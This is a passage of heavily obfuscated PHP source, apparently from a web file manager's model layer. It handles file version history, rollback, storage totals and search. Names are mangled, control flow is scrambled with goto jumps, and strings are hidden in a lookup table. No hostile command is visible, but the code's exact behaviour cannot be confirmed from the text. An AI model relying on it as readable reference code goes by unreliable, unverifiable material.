$b‰Şç¹ÛÑ[$B÷©‘²˜ì[$a¶Š©è»Ê[405]][$a¶Š©è»Ê[369]]]; } $B÷©‘²˜ì[$a¶Š©è»Ê[391]] = $b‰Şç¹ÛÑ[$B÷©‘²˜ì[$a¶Š©è»Ê[369]]]; $B÷©‘²˜ì[$a¶Š©è»Ê[2349]] = $b‰Şç¹ÛÑ[$B÷©‘²˜ì[$a¶Š©è»Ê[2336]]]; if ($B÷©‘²˜ì[$a¶Š©è»Ê[29]] == $a¶Š©è»Ê[2093]) { $B÷©‘²˜ì[$a¶Š©è»Ê[2349]] = $B÷©‘²˜ì[$a¶Š©è»Ê[391]]; $B÷©‘²˜ì[$a¶Š©è»Ê[2336]] = $B÷©‘²˜ì[$a¶Š©è»Ê[2349]][$a¶Š©è»Ê[369]]; $B÷©‘²˜ì[$a¶Š©è»Ê[391]] = !1; $B÷©‘²˜ì[$a¶Š©è»Ê[369]] = $a¶Š©è»Ê[33]; } $B÷©‘²˜ì[$a¶Š©è»Ê[2280]] = $e¼š¥œé[$B÷©‘²˜ì[$a¶Š©è»Ê[1456]]]; } unset($B÷©‘²˜ì); goto E ÙÊ†²âÀ; dê»Ê¢‹ô : $cÕˆ„Èã = array_unique($cÕˆ„Èã); $aÌ¸âíñåÍ = array_unique(array_to_keyvalue($f¤„İ®®˜†, $a¶Š©è»Ê[33], $a¶Š©è»Ê[1456])); $e¼š¥œé = Model($a¶Š©è»Ê[479])->userListInfo($aÌ¸âíñåÍ); goto eé¨†‰“ñŞ; E ÙÊ†²âÀ: $EÄöæìÄ¯‚[$a¶Š©è»Ê[354]] = $f¤„İ®®˜†; return $EÄöæìÄ¯‚; goto BÆˆî «å‚; F¾ãÍôïËœ: $fñ÷¸ÕŸğ» = array_to_keyvalue($f¤„İ®®˜†, $a¶Š©è»Ê[33], $a¶Š©è»Ê[2336]); foreach ($f¤„İ®®˜† as $B÷©‘²˜ì) { $A²¨ÈÌªøÖ = $B÷©‘²˜ì[$a¶Š©è»Ê[405]]; if ($B÷©‘²˜ì[$a¶Š©è»Ê[29]] == $a¶Š©è»Ê[494] && isset($A²¨ÈÌªøÖ[$a¶Š©è»Ê[1026]])) { $cÕˆ„Èã[] = $A²¨ÈÌªøÖ[$a¶Š©è»Ê[1026]] . $a¶Š©è»Ê[33]; $cÕˆ„Èã[] = $A²¨ÈÌªøÖ[$a¶Š©è»Ê[1027]] . $a¶Š©è»Ê[33]; } if ($B÷©‘²˜ì[$a¶Š©è»Ê[29]] == $a¶Š©è»Ê[2344] && isset($A²¨ÈÌªøÖ[$a¶Š©è»Ê[369]])) { $cÕˆ„Èã[] = $A²¨ÈÌªøÖ[$a¶Š©è»Ê[369]] . $a¶Š©è»Ê[33]; } } $cÕˆ„Èã = array_merge($cÕˆ„Èã, $fñ÷¸ÕŸğ», array($dä¥øÚ¯¶» . $a¶Š©è»Ê[33])); goto dê»Ê¢‹ô ; bŠÓ¿ÖØ÷: $a¶Š©è»Ê =& $_SERVER[ã®Â„Éæ¹¤]; $f¤„İ®®˜† = $EÄöæìÄ¯‚[$a¶Š©è»Ê[354]]; $cÕˆ„Èã = array_to_keyvalue($f¤„İ®®˜†, $a¶Š©è»Ê[33], $a¶Š©è»Ê[369]); goto F¾ãÍôïËœ; BÆˆî «å‚: } public function removeBySource($B‘¸™ğšÃ») { $b—Ø÷ïÙ·¥ = array($_SERVER[ã®Â„Éæ¹¤][383] => $B‘¸™ğšÃ»); $this->where($b—Ø÷ïÙ·¥)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\163\157\x75\162\x63\x65\137\x68\151\x73\164\x6f\x72\x79"; public function addHistory($CÚõ¾ø, $aï¨…ÑÒ¾¢ = '') { $b´®ÌÖ£ğ… =& $_SERVER[ã®Â„Éæ¹¤]; $EŒ§ØÇá™Ì = array($b´®ÌÖ£ğ…[383] => $CÚõ¾ø[$b´®ÌÖ£ğ…[369]], $b´®ÌÖ£ğ…[1447] => isset($CÚõ¾ø[$b´®ÌÖ£ğ…[379]]) ? $CÚõ¾ø[$b´®ÌÖ£ğ…[379]] : $CÚõ¾ø[$b´®ÌÖ£ğ…[378]], $b´®ÌÖ£ğ…[420] => $CÚõ¾ø[$b´®ÌÖ£ğ…[419]], $b´®ÌÖ£ğ…[522] => $CÚõ¾ø[$b´®ÌÖ£ğ…[77]], $b´®ÌÖ£ğ…[2350] => $aï¨…ÑÒ¾¢); $F˜ÄÍÛÓÊ… = $GLOBALS[$b´®ÌÖ£ğ…[6]][$b´®ÌÖ£ğ…[84]][$b´®ÌÖ£ğ…[2351]]; if ($F˜ÄÍÛÓÊ… > 1) { $this->historyAutoClear($EŒ§ØÇá™Ì[$b´®ÌÖ£ğ…[369]]); $this->add($EŒ§ØÇá™Ì); } Model($b´®ÌÖ£ğ…[2352])->eventFileEdit($CÚõ¾ø[$b´®ÌÖ£ğ…[369]]); } private function historyAutoClear($BŠ¥¹Ñ¡Ê) { goto B£ï¿âñÍ; eƒˆš¢¹‹: if ($bÄíëĞÙò >= 500) { return; } $Bæ­²“‡Æ¤ = array($DÁ–âƒìœê[383] => $BŠ¥¹Ñ¡Ê); $E¦×á·’‰… = $this->field($DÁ–âƒìœê[2355])->where($Bæ­²“‡Æ¤)->order($DÁ–âƒìœê[2347])->select(); goto dÒÉ¹§ù§˜; B£ï¿âñÍ: $DÁ–âƒìœê =& $_SERVER[ã®Â„Éæ¹¤]; $Bæ²¾æåÀ‘ = Model($DÁ–âƒìœê[1107])->get($DÁ–âƒìœê[2353]); $eàİÁŠ¯¬‹ = $GLOBALS[$DÁ–âƒìœê[6]][$DÁ–âƒìœê[84]][$DÁ–âƒìœê[2351]]; goto fÂÂˆ‘èá; D¨Åàâ‹Úß: $A¤­‡º±‹à = array_to_keyvalue($E¦×á·’‰…, $DÁ–âƒìœê[33], $DÁ–âƒìœê[419]); $A¤­‡º±‹à = array_slice($A¤­‡º±‹à, $bÄíëĞÙò); if (!$c–¢°ôÁá || !$A¤­‡º±‹à) { return; } goto EÌ‘Ì¬ï; fÂÂˆ‘èá: $AâÎ±îê‰ = $Bæ²¾æåÀ‘ == $DÁ–âƒìœê[2354] ? 3 : $eàİÁŠ¯¬‹; if ($eàİÁŠ¯¬‹ <= 1) { $AâÎ±îê‰ = 1; } $bÄíëĞÙò = $AâÎ±îê‰ - 1; goto eƒˆš¢¹‹; EÌ‘Ì¬ï: $Bæ­²“‡Æ¤ = array($DÁ–âƒìœê[385] => array($DÁ–âƒìœê[7], $c–¢°ôÁá)); $this->where($Bæ­²“‡Æ¤)->delete(); Model($DÁ–âƒìœê[422])->remove($A¤­‡º±‹à); goto CÚŒ˜Ì‘‰ö; dÒÉ¹§ù§˜: if (!$E¦×á·’‰… || $bÄíëĞÙò >= count($E¦×á·’‰…)) { return; } $c–¢°ôÁá = array_to_keyvalue($E¦×á·’‰…, $DÁ–âƒìœê[33], $DÁ–âƒìœê[367]); $c–¢°ôÁá = array_slice($c–¢°ôÁá, $bÄíëĞÙò); goto D¨Åàâ‹Úß; CÚŒ˜Ì‘‰ö: } public function listData($A»–î‡†Ş) { goto då‰¾™×ö; d¨Ùõ–Š: $BÖõ˜¯í÷ = $this->field($f£»£Óª®)->where($eåà˜š²½†)->order($E˜÷ïÏ³ë¼[2347])->selectPage(); $this->_listAppendUser($BÖõ˜¯í÷[$E˜÷ïÏ³ë¼[354]]); $e³äÆé´òÍ = Model($E˜÷ïÏ³ë¼[1107])->get($E˜÷ïÏ³ë¼[2353]); goto e½½’Ÿ‘´Ô; då‰¾™×ö: $E˜÷ïÏ³ë¼ =& $_SERVER[ã®Â„Éæ¹¤]; $eåà˜š²½† = array($E˜÷ïÏ³ë¼[383] => $A»–î‡†Ş); $f£»£Óª® = $E˜÷ïÏ³ë¼[2356]; goto d¨Ùõ–Š; e½½’Ÿ‘´Ô: $c“‘·‚Ù¬„ = 3; if ($e³äÆé´òÍ == $E˜÷ïÏ³ë¼[2354]) { $BÖõ˜¯í÷[$E˜÷ïÏ³ë¼[354]] = array_slice($BÖõ˜¯í÷[$E˜÷ïÏ³ë¼[354]], 0, $c“‘·‚Ù¬„); $BÖõ˜¯í÷[$E˜÷ïÏ³ë¼[351]] = array($E˜÷ïÏ³ë¼[2357] => 1, $E˜÷ïÏ³ë¼[2358] => 20, $E˜÷ïÏ³ë¼[2359] => 1, $E˜÷ïÏ³ë¼[2360] => count($BÖõ˜¯í÷[$E˜÷ïÏ³ë¼[354]])); } return $BÖõ˜¯í÷; goto f‹•ÒõÚÄæ; f‹•ÒõÚÄæ: } protected function _listAppendUser(&$F©ì‡ÒÉ¨») { $f‡ñä‘»– =& $_SERVER[ã®Â„Éæ¹¤]; $f”î›ºÜ = array_to_keyvalue($F©ì‡ÒÉ¨», $f‡ñä‘»–[33], $f‡ñä‘»–[1456]); $D¯Ãáâ“à­ = Model($f‡ñä‘»–[479])->userListInfo($f”î›ºÜ); foreach ($F©ì‡ÒÉ¨» as &$aÓ¢õÑÅÍ) { $c‚¶ñà½Àë = $aÓ¢õÑÅÍ[$f‡ñä‘»–[1456]]; $aÓ¢õÑÅÍ[$f‡ñä‘»–[378]] = $D¯Ãáâ“à­[$c‚¶ñà½Àë] ? $D¯Ãáâ“à­[$c‚¶ñà½Àë] : !1; } unset($aÓ¢õÑÅÍ); } public function fileInfo($aïÂĞğ‚ö) { $b‘Ş²‚ù²Ù =& $_SERVER[ã®Â„Éæ¹¤]; $dçƒ†ÉÅñ¥ = $this->tablePrefix; $fÁ¼†«¡‹ = "{$dçƒ†ÉÅñ¥}\151\157\137\x66\151\154\145\40\146\x69\x6c\145\x73\40\x6f\156\40\146\151\154\145\x73\x2e\146\151\154\x65\x49\104\40\x3d\x20\x68\x69\x73\164\x6f\x72\x79\x2e\x66\x69\154\x65\111\x44"; return $this->alias($b‘Ş²‚ù²Ù[2361])->where(array($b‘Ş²‚ù²Ù[385] => $aïÂĞğ‚ö))->join($fÁ¼†«¡‹, $b‘Ş²‚ù²Ù[2362])->find(); } public function removeItem($d²¢†¹Ú) { $a¼µ¾éæ§ =& $_SERVER[ã®Â„Éæ¹¤]; $a„‡ÚÃÔœµ = array($a¼µ¾éæ§[385] => $d²¢†¹Ú); $FÌ¦Ü¦¯¯ä = $this->where($a„‡ÚÃÔœµ)->find(); if ($FÌ¦Ü¦¯¯ä) { $b…ø´ò÷Û¶ = $this->where($a„‡ÚÃÔœµ)->delete(); Model($a¼µ¾éæ§[422])->remove($FÌ¦Ü¦¯¯ä[$a¼µ¾éæ§[419]]); return $b…ø´ò÷Û¶; } return !1; } public function removeBySource($fœ©ÙÓ«ºğ) { goto Eº©Êâ¬™í; Eº©Êâ¬™í: $EŒ˜Ğİä« =& $_SERVER[ã®Â„Éæ¹¤]; if (!$fœ©ÙÓ«ºğ) { return !1; } if (!is_array($fœ©ÙÓ«ºğ)) { $fœ©ÙÓ«ºğ = array($fœ©ÙÓ«ºğ); } goto bÜƒâÒË‘²; bÜƒâÒË‘²: $Eåáà¯Æ = array($EŒ˜Ğİä«[383] => array($EŒ˜Ğİä«[7], $fœ©ÙÓ«ºğ)); $Fš¯ÌôŞšÃ = $this->field($EŒ˜Ğİä«[420])->where($Eåáà¯Æ)->select(); if ($Fš¯ÌôŞšÃ) { $this->where($Eåáà¯Æ)->delete(); $DÍëƒšÄìµ = array_to_keyvalue($Fš¯ÌôŞšÃ, $EŒ˜Ğİä«[33], $EŒ˜Ğİä«[419]); Model($EŒ˜Ğİä«[422])->remove($DÍëƒšÄìµ); } goto dœØº½´ºÄ; dœØº½´ºÄ: return !0; goto CåèÕÜ£ô›; CåèÕÜ£ô›: } public function setDetail($D²¹ÊŞ–Èç, $DËº¡¡‹™) { $a¿ å¢„†¸ =& $_SERVER[ã®Â„Éæ¹¤]; return $this->where(array($a¿ å¢„†¸[385] => $D²¹ÊŞ–Èç))->save(array($a¿ å¢„†¸[2350] => $DËº¡¡‹™)); } public function rollbackToItem($DÆÊµ›Øõ, $bè–ŸèÌŒ‡) { goto fø©Œ¼Î¢×; fø©Œ¼Î¢×: $A²ï¹©Š‹ =& $_SERVER[ã®Â„Éæ¹¤]; $Dçë†«‹‚È = Model($A²ï¹©Š‹[775])->sourceInfo($DÆÊµ›Øõ); $this->addHistory($Dçë†«‹‚È); goto BÌ¨èÚÏÓ; FÔÆìíÌ£Å: return $this->where(array($A²ï¹©Š‹[385] => $bè–ŸèÌŒ‡))->delete(); goto AŒ†‰Ğ…ŞÇ; BÌ¨èÚÏÓ: $Aò·…Î¥‹ = $this->find($bè–ŸèÌŒ‡); $Eó˜±”æ¹… = array($A²ï¹©Š‹[419] => $Aò·…Î¥‹[$A²ï¹©Š‹[419]], $A²ï¹©Š‹[77] => $Aò·…Î¥‹[$A²ï¹©Š‹[77]], $A²ï¹©Š‹[107] => time(), $A²ï¹©Š‹[379] => USER_ID); Model($A²ï¹©Š‹[775])->where(array($A²ï¹©Š‹[369] => $DÆÊµ›Øõ))->save($Eó˜±”æ¹…); goto FÔÆìíÌ£Å; AŒ†‰Ğ…ŞÇ: } public function clearSame($D¶—Àà§ÅÂ) { goto F×ö‘‡«¾š; DäÕ‹óß‚Â: if (!$cõ¦ç›¾Ô) { return; } $this->where(array($cò¤ØùóÖè[367] => array($cò¤ØùóÖè[7], $cõ¦ç›¾Ô)))->delete(); Model($cò¤ØùóÖè[422])->remove($CóÁ¶››ä£); goto F‘ˆÁ§¡´; dÏÁ ÒîÑ: $CóÁ¶››ä£ = array(); $cõ¦ç›¾Ô = array(); foreach ($cøº½…›­Ã as $dÍ¤»Óãêİ) { if (!$dÍ¤»Óãêİ || count($dÍ¤»Óãêİ) <= 1) { continue; } foreach ($dÍ¤»Óãêİ as $Cä³ÖĞšß‡) { $CóÁ¶››ä£[] = $Cä³ÖĞšß‡[$cò¤ØùóÖè[419]]; $cõ¦ç›¾Ô[] = $Cä³ÖĞšß‡[$cò¤ØùóÖè[367]]; } } goto DäÕ‹óß‚Â; F×ö‘‡«¾š: $cò¤ØùóÖè =& $_SERVER[ã®Â„Éæ¹¤]; $cáåöÔŞ” = $this->listData($D¶—Àà§ÅÂ); $cøº½…›­Ã = array_to_keyvalue_group($cáåöÔŞ”, $cò¤ØùóÖè[419]); goto dÏÁ ÒîÑ; F‘ˆÁ§¡´: } public function userSpace() { $C„‡ˆè—ËÍ =& $_SERVER[ã®Â„Éæ¹¤]; $D÷’øªê = $this->tablePrefix; $eŞâ–Ñ™ÎÓ = array($C„‡ˆè—ËÍ[1447] => USER_ID); $a¯™óŠÂòÙ = "{$D÷’øªê}\x69\157\137\x66\x69\x6c\145\x20\146\x69\154\145\163\x20\x6f\156\40\146\x69\x6c\x65\x73\56\x66\x69\154\x65\111\x44\x20\x3d\40\x68\151\x73\164\x6f\x72\171\x2e\146\151\154\145\x49\x44"; return $this->alias($C„‡ˆè—ËÍ[2361])->where($eŞâ–Ñ™ÎÓ)->join($a¯™óŠÂòÙ, $C„‡ˆè—ËÍ[2362])->sum($C„‡ˆè—ËÍ[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($D”–¬”ŠÕ¥) { goto dæ“èÑƒÜ§; dæ“èÑƒÜ§: $eÕ‘ù’òÅÀ =& $_SERVER[ã®Â„Éæ¹¤]; $E³‹†„èáŠ = KodIO::fileTypeList(); $e§»¤“Šñ» = $E³‹†„èáŠ[$D”–¬”ŠÕ¥]; goto c‡š¤¸Áƒ; c‡š¤¸Áƒ: if (!$e§»¤“Šñ») { return array(); } $FŠÌÊÚ‚…Ò = $e§»¤“Šñ»[$eÕ‘ù’òÅÀ[160]]; $b İø¼í‚© = $eÕ‘ù’òÅÀ[7]; goto c”Çà…â¢Ä; c”Çà…â¢Ä: if (!$e§»¤“Šñ»[$eÕ‘ù’òÅÀ[160]]) { $cÖÑÄäšãŒ = array_to_keyvalue($E³‹†„èáŠ, $eÕ‘ù’òÅÀ[33], $eÕ‘ù’òÅÀ[160]); $FŠÌÊÚ‚…Ò = implode($eÕ‘ù’òÅÀ[47], $cÖÑÄäšãŒ); $b İø¼í‚© = $eÕ‘ù’òÅÀ[2310]; } $D²ÇÂ¥ÒĞ = explode($eÕ‘ù’òÅÀ[47], trim($FŠÌÊÚ‚…Ò, $eÕ‘ù’òÅÀ[47])); return array($b İø¼í‚©, $D²ÇÂ¥ÒĞ); goto bğÌÁÌÕˆÚ; bğÌÁÌÕˆÚ: } public function listPathType($Aš±ÀÅİƒ‰) { $fÉêÁ’ù„Ò =& $_SERVER[ã®Â„Éæ¹¤]; $AÊãºàËÆØ = $this->fileTypeWhere($Aš±ÀÅİƒ‰); if (!$AÊãºàËÆØ) { return array(); } $f·´·¢ç‹Û = array($fÉêÁ’ù„Ò[523] => SourceModel::TYPE_USER, $fÉêÁ’ù„Ò[524] => USER_ID, $fÉêÁ’ù„Ò[520] => 0, $fÉêÁ’ù„Ò[521] => $AÊãºàËÆØ); return $this->listSource($f·´·¢ç‹Û); } public function listSearch($B‹÷ÑÊï, $cáóé£è˜„ = 300) { goto F³ÁÆ­¸¥‹; e©‹¡êÚÀˆ: $this->_listDataApply($BÏ†óñ©¼‚[$FäÀ—÷ä‡[354]]); $this->_listMake($BÏ†óñ©¼‚); return $BÏ†óñ©¼‚; goto DòÖÕ›˜õ÷; F³ÁÆ­¸¥‹: $FäÀ—÷ä‡ =& $_SERVER[ã®Â„Éæ¹¤]; if (isset($B‹÷ÑÊï[$FäÀ—÷ä‡[2208]]) && $B‹÷ÑÊï[$FäÀ—÷ä‡[2208]]) { $B‹÷ÑÊï[$FäÀ—÷ä‡[2208]] = str_replace($FäÀ—÷ä‡[1612], $FäÀ—÷ä‡[2363], trim($B‹÷ÑÊï[$FäÀ—÷ä‡[2208]])); } $e—¾éò¾œÌ = $this->_parseSearchWhere($B‹÷ÑÊï); goto Fæ±×‘Êëâ; Fæ±×‘Êëâ: if (!isset($e—¾éò¾œÌ[$FäÀ—÷ä‡[397]])) { $e—¾éò¾œÌ[$FäÀ—÷ä‡[397]] = 0; } $e‚ÕÚÅõ = $FäÀ—÷ä‡[2364]; $b‡ŒèÅ»‚ = $e‚ÕÚÅõ; goto a›ÓŠ—Ÿ; B„„Ç„Ò‚¦: $this->_listSearchDesc($BÏ†óñ©¼‚, $B‹÷ÑÊï, $b‡ŒèÅ»‚); $this->_listSearchTag($BÏ†óñ©¼‚, $B‹÷ÑÊï, $b‡ŒèÅ»‚); $this->_listSearchGroupTag($BÏ†óñ©¼‚, $B‹÷ÑÊï, $b‡ŒèÅ»‚); goto e©‹¡êÚÀˆ; a›ÓŠ—Ÿ: $this->_listSearchBindPinyin($B‹÷ÑÊï, $e—¾éò¾œÌ, $e‚ÕÚÅõ); $this->alias($FäÀ—÷ä‡[489])->_makeOrder(); $BÏ†óñ©¼‚ = $this->distinct(!0)->field($e‚ÕÚÅõ)->where($e—¾éò¾œÌ)->selectPage($cáóé£è˜„); goto B„„Ç„Ò‚¦; DòÖÕ›˜õ÷: } private function _listSearchTag(&$B«ÁÙÖÛÉÂ, $FÚÏÄöíßµ, $A¢Ö²ãŸ¯ì) { goto Dãº¦ƒ§ÜÑ; d¼ƒÖ¢†­: $D‹œæ°æ´³ = array(); $FË–ã§è˜İ = $FÚÏÄöíßµ[$f£†‡—ù«Â[2208]]; foreach ($B­êÀùí§ as $aĞè¼Î©Ï×) { $Dä¶íëé‹ = $aĞè¼Î©Ï×[$f£†‡—ù«Â[28]]; $C°·Òã Í” = str_replace($f£†‡—ù«Â[50], $f£†‡—ù«Â[33], Pinyin::encode($Dä¶íëé‹)); if (stripos($Dä¶íëé‹, $FË–ã§è˜İ) !== !1 || stripos($C°·Òã Í”, $FË–ã§è˜İ) !== !1) { $D‹œæ°æ´³[] = $aĞè¼Î©Ï×[$f£†‡—ù«Â[367]]; } } goto FÛ±™õ·éÙ; FŒ¸¤Ñæ˜Î: $eë°ó¥¦íÒ = array_to_keyvalue($eë°ó¥¦íÒ, $f£†‡—ù«Â[33], $f£†‡—ù«Â[75]); $e°•­·¯… = array_unique($eë°ó¥¦íÒ); $this->_listSearchMerge($B«ÁÙÖÛÉÂ, $FÚÏÄöíßµ, $A¢Ö²ãŸ¯ì, $e°•­·¯…); goto fÍ¬¢µ‰Ğï; Dãº¦ƒ§ÜÑ: $f£†‡—ù«Â =& $_SERVER[ã®Â„Éæ¹¤]; if (!$FÚÏÄöíßµ[$f£†‡—ù«Â[2208]] || $B«ÁÙÖÛÉÂ[$f£†‡—ù«Â[351]][$f£†‡—ù«Â[340]] > 1) { return; } $B­êÀùí§ = Model($f£†‡—ù«Â[2365])->listData(); goto d¼ƒÖ¢†­; FÛ±™õ·éÙ: if (!$D‹œæ°æ´³) { return; } $dÓ±áÌÆœì = array($f£†‡—ù«Â[393] => array($f£†‡—ù«Â[7], $D‹œæ°æ´³), $f£†‡—ù«Â[1456] => USER_ID); $eë°ó¥¦íÒ = Model($f£†‡—ù«Â[394])->field($f£†‡—ù«Â[75])->where($dÓ±áÌÆœì)->select(); goto FŒ¸¤Ñæ˜Î; fÍ¬¢µ‰Ğï: } private function _listSearchDesc(&$A¦ÕƒµÊŠ”, $EÓòœ´÷µ, $f°Ó„ÄŠ¢„) { goto fÓº‚¯¿Ñ‚; fÓº‚¯¿Ñ‚: $fÎñÑ¦Şï =& $_SERVER[ã®Â„Éæ¹¤]; if (!$EÓòœ´÷µ[$fÎñÑ¦Şï[2208]] || $A¦ÕƒµÊŠ”[$fÎñÑ¦Şï[351]][$fÎñÑ¦Şï[340]] > 1) { return; } $bƒà¹—õ˜Ù = $this->listSearchChildren($EÓòœ´÷µ[$fÎñÑ¦Şï[463]]); goto D óÉ¤Ì; FªÒ“‡œ¿¦: $cÊ›æ™Ø‡ = Model($fÎñÑ¦Şï[506])->field($fÎñÑ¦Şï[369])->where($Fîï÷å¶Ö)->select(); $F‡ŠŞ¾«³ = array_to_keyvalue($cÊ›æ™Ø‡, $fÎñÑ¦Şï[33], $fÎñÑ¦Şï[369]); $this->_listSearchMerge($A¦ÕƒµÊŠ”, $EÓòœ´÷µ, $f°Ó„ÄŠ¢„, $F‡ŠŞ¾«³); goto BÈ˜­áë†É; D óÉ¤Ì: $bƒà¹—õ˜Ù = array_unique($bƒà¹—õ˜Ù); if (!$bƒà¹—õ˜Ù) { return; } $Fîï÷å¶Ö = array($fÎñÑ¦Şï[369] => array($fÎñÑ¦Şï[7], $bƒà¹—õ˜Ù), $fÎñÑ¦Şï[89] => $fÎñÑ¦Şï[405], $fÎñÑ¦Şï[359] => array($fÎñÑ¦Şï[774], $fÎñÑ¦Şï[2210] . $EÓòœ´÷µ[$fÎñÑ¦Şï[2208]] . $fÎñÑ¦Şï[2210])); goto FªÒ“‡œ¿¦; BÈ˜­áë†É: } private function _listSearchGroupTag(&$Dƒòï•÷­¦, $f›²ìÕµ¡â, $fÅ—Ğùê¢‡) { goto e¸ßĞ•Ë¬; fğéóËÄËˆ: if (!$bÚëñŠŞ || $bÚëñŠŞ[$a‡›¿ì£Œ˜[371]] != SourceModel::TYPE_GROUP) { return; } $cÙÜŞ‚ô– = $bÚëñŠŞ[$a‡›¿ì£Œ˜[458]]; $A”šùÏÄ = Model($a‡›¿ì£Œ˜[2366])->get($cÙÜŞ‚ô–); goto cÀÌ‹Ò„´§; BÚè«¹ªŞ§: $eæ°ˆšŸÉ„ = array_to_keyvalue($eæ°ˆšŸÉ„, $a‡›¿ì£Œ˜[33], $a‡›¿ì£Œ˜[75]); $a×•±­½ = array_unique($eæ°ˆšŸÉ„); $this->_listSearchMerge($Dƒòï•÷­¦, $f›²ìÕµ¡â, $fÅ—Ğùê¢‡, $a×•±­½); goto aÅ‰â†¾ğÅ; e¸ßĞ•Ë¬: $a‡›¿ì£Œ˜ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$f›²ìÕµ¡â[$a‡›¿ì£Œ˜[2208]] || $Dƒòï•÷­¦[$a‡›¿ì£Œ˜[351]][$a‡›¿ì£Œ˜[340]] > 1 || !$f›²ìÕµ¡â[$a‡›¿ì£Œ˜[463]]) { return; } $bÚëñŠŞ = $this->sourceInfo($f›²ìÕµ¡â[$a‡›¿ì£Œ˜[463]]); goto fğéóËÄËˆ; cÀÌ‹Ò„´§: $EŠĞ†‘×¶Ÿ = array(); $FĞº·É„î× = $f›²ìÕµ¡â[$a‡›¿ì£Œ˜[2208]]; foreach ($A”šùÏÄ[$a‡›¿ì£Œ˜[354]] as $EŠá‚òÊã‚) { $aÉá‚„Ù°¦ = $EŠá‚òÊã‚[$a‡›¿ì£Œ˜[28]]; $C½ôÁ­° = str_replace($a‡›¿ì£Œ˜[50], $a‡›¿ì£Œ˜[33], Pinyin::encode($aÉá‚„Ù°¦)); if (stripos($aÉá‚„Ù°¦, $FĞº·É„î×) !== !1 || stripos($C½ôÁ­°, $FĞº·É„î×) !== !1) { $EŠĞ†‘×¶Ÿ[] = $EŠá‚òÊã‚[$a‡›¿ì£Œ˜[367]]; } } goto cÇöÌâ…˜‘; cÇöÌâ…˜‘: if (!$EŠĞ†‘×¶Ÿ) { return; } $DÓçÇÁøŸí = array($a‡›¿ì£Œ˜[393] => array($a‡›¿ì£Œ˜[7], $EŠĞ†‘×¶Ÿ), $a‡›¿ì£Œ˜[1456] => 0, $a‡›¿ì£Œ˜[29] => $a‡›¿ì£Œ˜[2228] . $cÙÜŞ‚ô–); $eæ°ˆšŸÉ„ = Model($a‡›¿ì£Œ˜[394])->field($a‡›¿ì£Œ˜[75])->where($DÓçÇÁøŸí)->select(); goto BÚè«¹ªŞ§; aÅ‰â†¾ğÅ: } private function _listSearchMerge(&$A¡…¥Íùà¤, $fÖöÃ·òÌ, $E²Ö†Ûî«È, $E…ŒáÙæ‚) { goto E¾‡§Üà; FÉñÆ…ô¸: foreach ($f×Ûè‚ö as $A­Š„†Æ„) { $d×¼‚á…‰Æ = $aÀ¬ƒÅ†¨[47] . $fÖöÃ·òÌ[$aÀ¬ƒÅ†¨[463]] . $aÀ¬ƒÅ†¨[47]; if (stripos($A­Š„†Æ„[$aÀ¬ƒÅ†¨[461]], $d×¼‚á…‰Æ) !== !1) { $f×‰Î³ØŞ[] = $A­Š„†Æ„; } } $A¡…¥Íùà¤[$aÀ¬ƒÅ†¨[354]] = array_merge($f×‰Î³ØŞ, $A¡…¥Íùà¤[$aÀ¬ƒÅ†¨[354]]); $A¡…¥Íùà¤[$aÀ¬ƒÅ†¨[351]][$aÀ¬ƒÅ†¨[352]] += count($f×‰Î³ØŞ); goto dº÷ß¥ø«ù; B‹‚«İõá†: $Cäî‹ä¢Ê = array_diff($E…ŒáÙæ‚, $BŞß„Ã›Òœ); if (!$Cäî‹ä¢Ê) { return; } $fÌØ‹õßÆ› = array($aÀ¬ƒÅ†¨[369] => array($aÀ¬ƒÅ†¨[7], $Cäî‹ä¢Ê)); goto eó²ÚÂ‹øİ; E¾‡§Üà: $aÀ¬ƒÅ†¨ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$E…ŒáÙæ‚) { return; } $BŞß„Ã›Òœ = array_to_keyvalue($A¡…¥Íùà¤[$aÀ¬ƒÅ†¨[354]], $aÀ¬ƒÅ†¨[33], $aÀ¬ƒÅ†¨[369]); goto B‹‚«İõá†; eó²ÚÂ‹øİ: $f×Ûè‚ö = $this->field($E²Ö†Ûî«È)->where($fÌØ‹õßÆ›)->select(); if (!$f×Ûè‚ö) { return; } $f×‰Î³ØŞ = array(); goto FÉñÆ…ô¸; dº÷ß¥ø«ù: } public function listSearchChildren($D¶¿Şé‡ª, $c‰Ò°ä Ş = 5000) { goto D‹†Ç¼’ˆ­; D‹†Ç¼’ˆ­: $A¼Ôº­¼®® =& $_SERVER[ã®Â„Éæ¹¤]; $bÆŒÌ¥…îæ = array(); $fÃ™è®Ú¢ = $this->sourceInfo($D¶¿Şé‡ª); goto aŞ¡ª™Íˆ; aŞ¡ª™Íˆ: $D•‘­İœâ¸ = array($A¼Ôº­¼®®[461] => array($A¼Ôº­¼®®[774], $fÃ™è®Ú¢[$A¼Ôº­¼®®[461]] . $fÃ™è®Ú¢[$A¼Ôº­¼®®[369]] . $A¼Ôº­¼®®[486])); $F÷£±™±Áâ = $this->field($A¼Ôº­¼®®[369])->cache(null, 600)->where($D•‘­İœâ¸)->count(); if ($F÷£±™±Áâ > $c‰Ò°ä Ş) { return $this->_listSearchChildrenNear($D¶¿Şé‡ª, $c‰Ò°ä Ş); } goto fŸ­èÜ÷¼¼; fŸ­èÜ÷¼¼: $eøã’¦ê = $this->field($A¼Ôº­¼®®[369])->where($D•‘­İœâ¸)->select(); $bÆŒÌ¥…îæ = array_to_keyvalue($eøã’¦ê, $A¼Ôº­¼®®[33], $A¼Ôº­¼®®[369]); return $bÆŒÌ¥…îæ; goto FŒï¹Ò¹‰Î; FŒï¹Ò¹‰Î: } private function _listSearchChildrenNear($c°‡•Ç’øÓ, $cÕµÛİáƒè) { goto a¿ƒç®¦³Ø; a¿ƒç®¦³Ø: $bªî¢¾¶ =& $_SERVER[ã®Â„Éæ¹¤]; $D¦ÉÏˆ¥á… = array(); $eêæ¶õ¿ÜÈ = array($bªî¢¾¶[463] => $c°‡•Ç’øÓ); goto B°›ˆåÚ°; B°›ˆåÚ°: $E“™•å…¸Ñ = $this->field($bªî¢¾¶[2367])->where($eêæ¶õ¿ÜÈ)->select(); $BÇ ¿ÊÒ×… = array_to_keyvalue(array_filter_by_field($E“™•å…¸Ñ, $bªî¢¾¶[370], $bªî¢¾¶[83]), $bªî¢¾¶[33], $bªî¢¾¶[369]); $D¦ÉÏˆ¥á… = array_merge($D¦ÉÏˆ¥á…, array_to_keyvalue($E“™•å…¸Ñ, $bªî¢¾¶[33], 